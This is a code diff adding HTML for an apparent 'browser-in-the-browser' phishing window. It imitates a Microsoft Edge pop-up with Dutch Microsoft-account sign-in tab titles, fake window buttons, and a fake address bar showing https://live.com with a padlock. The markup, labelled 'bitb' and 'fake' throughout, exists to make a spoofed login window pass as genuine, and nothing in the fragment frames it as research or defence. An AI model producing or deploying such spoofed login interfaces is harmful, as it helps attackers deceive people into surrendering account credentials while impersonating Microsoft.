@@ -1,0 +1,24 @@
+<div class="fake-tabs-bar edge" id="bitbTabsBar">
+    <div class="tab-list">
+        <div class="fake-tab active" data-tab="tab1" onclick="switchTab('tab1', 'https://live.com')">
+            <span class="tab-title">🔐 Aanmelden bij Microsoft-account</span>
+        </div>
+        <div class="fake-tab" data-tab="tab2" onclick="switchTab('tab2', 'https://microsoft.com')">
+            <span class="tab-title">📄 Privacyverklaring</span>
+            <!-- Slechts één sluitknop die direct de JavaScript closeTab aanroept -->
+            <span class="tab-close" onclick="closeTab(event, 'tab2')">✕</span>
+        </div>
+    </div>
+    <div class="window-controls">
+        <div class="win-btn" onclick="minimizeFakeWindow(event)">➖</div>
+        <div class="win-btn" onclick="maximizeFakeWindow(event)">🔲</div>
+        <div class="win-btn close" onclick="closeFakeWindow()">✕</div>
+    </div>
+</div>
+<div class="fake-header edge" id="bitbHeader">
+    <div class="edge-nav">← → ↻</div>
+    <form class="address-form" onsubmit="handleUrlSubmit(event)">
+        <span class="lock">🔒</span>
+        <input type="text" id="fakeUrlInput" class="address-input" value="https://live.com">
+    </form>
+</div>
